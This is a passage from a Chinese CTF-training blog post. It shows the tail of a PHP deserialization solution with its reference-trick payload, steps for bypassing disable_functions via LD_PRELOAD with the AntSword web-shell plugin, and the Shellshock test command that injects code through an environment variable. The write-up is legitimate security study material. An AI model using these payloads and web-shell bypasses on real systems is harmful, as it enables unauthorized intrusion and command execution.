class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>              <span class="hljs-comment">//echo file_get_contents(&quot;/flag&quot;);</span><br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> BUU();<br><span class="hljs-variable">$a</span>-&gt;input=&amp;a-&gt;correct;<span class="hljs-comment">//传引用</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;s:0:&quot;&quot;;&#125; </span><br></code></pre></td></tr></table></figure>

<p>拼接payload即可</p>
<h2 id="Bypass-disable-function-——-LD-PRELOAD"><a href="#Bypass-disable-function-——-LD-PRELOAD" class="headerlink" title="Bypass disable_function —— LD_PRELOAD"></a>Bypass disable_function —— LD_PRELOAD</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729142924840.png" srcset="/img/loading.gif" lazyload alt="image-20210729142924840"></p>
<p>蚁剑连接</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729143019466.png" srcset="/img/loading.gif" lazyload alt="image-20210729143019466"></p>
<p>直接查看flag文件为空 下载文件得到没权限</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729143920521.png" srcset="/img/loading.gif" lazyload alt="                          "></p>
<p>终端始终返回127  这是运行环境和登录用户的运行环境存在差异造成的 这样设置就是权限不够</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729143100697.png" srcset="/img/loading.gif" lazyload alt="image-20210729143100697"></p>
<p>在蚁剑使用插件绕过disable_function，成功后可以看到 <code>/var/www/html/</code> 目录下新建了一个 <code>.antproxy.php</code> 文件</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729154051090.png" srcset="/img/loading.gif" lazyload alt="image-20210729154051090"></p>
<p>改用.antproxy.php连接蚁剑 即可绕过</p>
<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>ShellShock,破壳漏洞，出现于2014年<br> 可以通过以下命令来判断是否存在这个漏洞<br> <code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br> 如果出现vulnerable说明存在</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/cs/">cs</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf-training/">ctf-training</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/12/04/%E8%AE%A1%E7%BD%91/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">计算机网络基础</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                        <span class="hidden-mobile">信息收集基础篇</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://wo02ie.github.io" target="_blank" rel="nofollow noopener"><span>wo02ie</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
